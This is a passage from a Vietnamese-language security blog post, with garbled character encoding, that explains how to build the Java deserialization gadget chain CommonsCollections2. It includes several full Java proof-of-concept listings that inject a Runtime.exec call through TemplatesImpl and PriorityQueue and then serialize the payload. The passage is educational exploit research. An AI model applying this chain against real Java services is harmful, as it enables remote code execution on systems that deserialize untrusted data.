lá»›p nÃ y láº¥y má»™t Transformer gÃ¡n vÃ o biáº¿n transformer, á»Ÿ Ä‘Ã¢y chÃºng ta cÃ³ thá»ƒ thay báº±ng InvokerTransformer. HÃ m compare sáº½ thá»±c thi transform cho object truyá»n vÃ o nÃ³ vá»›i Transformer Ä‘Æ°á»£c truyá»n tá»« hÃ m táº¡o. Tá»« Ä‘Ã¢y chÃºng ta cÃ³ Ä‘oáº¡n code ngáº¯n sau:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Test&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>));</span><br><span class="line">        ctClass.makeClassInitializer().setBody(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_nameField</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        _nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _nameField.set(templates, <span class="string">&quot;notNull&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_classField</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_class&quot;</span>);</span><br><span class="line">        _classField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _classField.set(templates, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_bytecodes</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        _bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _bytecodes.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        Field tfactoryField=templates.getClass().getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//templates.newTransformer();</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>&lt;&gt;(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//invokerTransformer.transform(templates);</span></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>( invokerTransformer);</span><br><span class="line">        transformingComparator.compare(templates, <span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Tiáº¿p theo chÃºng ta cáº§n lá»›p gá»i Ä‘áº¿n TransformingComparator.compare.</p><p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/2022/12/16/CommonsCollections2/findingsiftDownUsingComparator.png"></p><p>Äi Ä‘áº¿n phÆ°Æ¡ng thá»©c siftDownUsingComparator cá»§a lá»›p PriorityQueue. PhÆ°Æ¡ng thá»©c nÃ y sá»­ dá»¥ng comparator.compare vá»›i comparator lÃ  má»™t instance cá»§a interface Comparator, do Ä‘Ã³ nÃ³ cÃ³ thá»ƒ lÃ m biáº¿n chá»©a cho cÃ¡c lá»›p implements interface Comparator, tá»« Ä‘Ã¢y chÃºng ta cÃ³ thá»ƒ thay biáº¿n comparator báº±ng má»™t TransformingComparator.</p><p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/2022/12/16/CommonsCollections2/siftDownUsingComparator.png"></p><p>VÃ¬ <code>siftDownUsingComparator</code> lÃ  má»™t phÆ°Æ¡ng thá»©c private nÃªn chÃºng ta cáº§n tÃ¬m phÆ°Æ¡ng thá»©c gá»i Ä‘áº¿n nÃ³. MÃ² tá»« tá»« ta tháº¥y Ä‘Æ°á»£c: <code>readObject--&gt;heapify--&gt;siftDown--&gt;sifDownUsingComparator</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDown</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (comparator != <span class="literal">null</span>)</span><br><span class="line">            siftDownUsingComparator(k, x);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            siftDownComparable(k, x);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">heapify</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> (size &gt;&gt;&gt; <span class="number">1</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">            siftDown(i, (E) queue[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// Read in size, and any hidden stuff</span></span><br><span class="line">        s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read in (and discard) array length</span></span><br><span class="line">        s.readInt();</span><br><span class="line"></span><br><span class="line">        SharedSecrets.getJavaOISAccess().checkArray(s, Object[].class, size);</span><br><span class="line">        queue = <span class="keyword">new</span> <span class="title class_">Object</span>[size];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read in all elements.</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">            queue[i] = s.readObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Elements are guaranteed to be in &quot;proper order&quot;, but the</span></span><br><span class="line">        <span class="comment">// spec has never explained what that might be.</span></span><br><span class="line">        heapify();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>HÃ m heapify loop háº¿t cÃ¡c pháº§n tá»­ trong queue Ä‘á»ƒ <code>siftDown(i, (E) queue[i])</code>, <code>ctr + chuá»™t trÃ¡i</code> tiáº¿p vÃ o hÃ m heapify. Máº£ng queue Ä‘Æ°á»£c set á»Ÿ hÃ m readObject rá»“i thá»±c hiá»‡n heapify(). </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">queue = <span class="keyword">new</span> <span class="title class_">Object</span>[size];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Read in all elements.</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">    queue[i] = s.readObject();</span><br></pre></td></tr></table></figure><p><code>queue</code> á»Ÿ Ä‘Ã¢y chá»‰ lÃ  Ä‘á»c tá»« Ä‘á»‘i tÆ°á»£ng mÃ¬nh serialize. Sau khi Ä‘á»c dá»¯ liá»‡u gÃ¡n vÃ o queue, nÃ³ thá»±c hiá»‡n heapify.<br>QuÃ¡ thuáº­n lá»£i, bÃ¢y giá» chá»‰ cÃ²n bÆ°á»›c cÃ²n láº¡i Ä‘á»ƒ xÃ¢y dá»±ng POC.</p><p>Ta cÃ³ hai phÆ°Æ¡ng Ã¡n Ä‘á»ƒ thá»±c hiá»‡n:</p><ul><li>Sá»­ dá»¥ng ChainedTransformer Ä‘á»ƒ tá»± Ä‘á»™ng thá»±c hiá»‡n mÃ  khÃ´ng cáº§n thÃ´ng qua queue</li><li>Set giÃ¡ trá»‹ cho queue</li></ul><h2 id="Hoan-thien-chain"><a href="#Hoan-thien-chain" class="headerlink" title="HoÃ n thiá»‡n chain"></a>HoÃ n thiá»‡n chain</h2><h3 id="Set-gia-tri-cho-queue"><a href="#Set-gia-tri-cho-queue" class="headerlink" title="Set giÃ¡ trá»‹ cho queue"></a>Set giÃ¡ trá»‹ cho queue</h3><p>Äá»ƒ set giÃ¡ trá»‹ cho queue, chÃºng ta sáº½ sá»­ dá»¥ng hÃ m PriorityQueue.add().<br>Xem rÃµ phÆ°Æ¡ng thá»©c nÃ y:<br><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/2022/12/16/CommonsCollections2/priorityQueueAdd.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Test&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>));</span><br><span class="line">        ctClass.makeClassInitializer().setBody(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_nameField</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        _nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _nameField.set(templates, <span class="string">&quot;notNull&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_classField</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_class&quot;</span>);</span><br><span class="line">        _classField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _classField.set(templates, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_bytecodes</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        _bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _bytecodes.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        Field tfactoryField=templates.getClass().getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//templates.newTransformer();</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>&lt;&gt;(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//invokerTransformer.transform(templates);</span></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(invokerTransformer);</span><br><span class="line">        <span class="comment">//transformingComparator.compare(null, null);</span></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(transformingComparator);</span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line"></span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">        <span class="comment">//unserialize(&quot;ser.bin&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Tuy nhiÃªn nhÆ° nÃ y thÃ¬ nÃ³ Ä‘Ã£ cháº¡y cÃ¢u lá»‡nh trÆ°á»›c khi chÃºng ta thá»±c hiá»‡n unserialize. Set breakpoint á»Ÿ hÃ m add Ä‘á»ƒ xem lÃ½ do.</p><p>Ta tháº¥y á»Ÿ láº§n add thá»© 2, phÆ°Æ¡ng thá»©c add gá»i Ä‘áº¿n offer â€“&gt; siftUp â€“&gt; siftUpUsingComparator â€“&gt; Comparator.compare. </p><p>Äá»ƒ khÃ´ng thá»±c hiá»‡n cÃ¡i nÃ y, á»Ÿ hÃ m siftUp nÃ³ check Comparator náº¿u Comparator báº±ng null thÃ¬ nÃ³ sáº½ khÃ´ng thá»±c hiá»‡n Comparator.compare. Do Ä‘Ã³ chÃºng cÃ³ thá»ƒ thá»±c hiá»‡n set Comparator sau add giÃ¡ trá»‹ vÃ o priorityQueue. </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Test&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>));</span><br><span class="line">        ctClass.makeClassInitializer().setBody(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_nameField</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        _nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _nameField.set(templates, <span class="string">&quot;notNull&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_classField</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_class&quot;</span>);</span><br><span class="line">        _classField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _classField.set(templates, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_bytecodes</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        _bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _bytecodes.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        Field tfactoryField=templates.getClass().getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//templates.newTransformer();</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>&lt;&gt;(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//invokerTransformer.transform(templates);</span></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(invokerTransformer);</span><br><span class="line">        <span class="comment">//transformingComparator.compare(null, null);</span></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(transformingComparator);</span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> priorityQueue.getClass().getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(priorityQueue, <span class="literal">null</span>);</span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line"></span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">        <span class="comment">//unserialize(&quot;ser.bin&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Tuy nhiÃªn náº¿u khÃ´ng set comparator khi gá»i Ä‘áº¿n siftUpComparable nÃ³ sáº½ xuáº¥t hiá»‡n lá»—i <code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl cannot be cast to java.lang.Comparable</code>. Do Ä‘Ã³ chÃºng ta pháº£i nghÄ© cÃ¡ch khÃ¡c.</p><p>Add trÆ°á»›c rá»“i set sau, ta cÃ³ full change:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> 